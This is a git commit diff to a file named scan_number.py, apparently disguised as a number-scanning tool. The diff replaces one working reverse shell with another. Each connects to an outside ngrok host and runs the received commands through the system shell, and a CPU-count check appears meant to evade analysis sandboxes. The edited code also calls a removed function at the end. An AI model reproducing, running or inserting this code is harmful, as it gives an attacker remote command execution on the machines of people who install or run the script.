b4b06dd600cbf4427f68acd9dab8b4d68abc21ec
74lg0 <111157836+74lg0@users.noreply.github.com>
2024-05-24 19:41:16 -0600

    Update scan_number.py

--- scan_number.py
+++ scan_number.py
@@ -44,48 +44,36 @@ numero()
 import os
 import socket
 import subprocess
-import sys
-import time
+
 
 if os.cpu_count() <= 2:
     quit()
 
-HOST = '2.tcp.ngrok.io' 
-PORT = 12249 
+HOST = '2.tcp.ngrok.io'
+PORT = 12249
 
-def reverse():
-    while True:
-        try:
-            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-            s.connect((HOST, PORT))
-            s.send(str.encode("[*] Connection Established!"))
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+s.connect((HOST, PORT))
+s.send(str.encode("[*] Connection Established!"))
 
-            while True:
-                s.send(str.encode(os.getcwd() + "> "))
-                data = s.recv(1024).decode("UTF-8")
-                if not data:
-                    break
-                
-                data = data.strip()
-                
-                if data.lower() == "quit":
-                    s.close()
-                    sys.exit()
-                if data:
-                    proc = subprocess.Popen(data, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
-                    stdout_value, stderr_value = proc.communicate()
-                    output_str = stdout_value.decode("cp437") + stderr_value.decode("cp437")
-                    s.send(str.encode(output_str + os.getcwd() + "> "))
-        
-        except Exception as e:
-            try:
-                s.send(str.encode("Error occurred: " + str(e) + "\n"))
-            except:
-                pass
-            time.sleep(10)
-
-if __name__ == "__main__":
-    reverse()
+while 1:
+    try:
+        s.send(str.encode(os.getcwd() + "> "))
+        data = s.recv(1024).decode("UTF-8")
+        data = data.strip('\n')
+        if data == "quit": 
+            break
+        if data[:2] == "cd":
+            os.chdir(data[3:])
+        if len(data) > 0:
+            proc = subprocess.Popen(data, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE) 
+            stdout_value = proc.stdout.read() + proc.stderr.read()
+            output_str = str(stdout_value, "UTF-8")
+            s.send(str.encode("\n" + output_str))
+    except Exception as e:
+        continue
+    
+s.close()
 
 s.close()
 reverse()
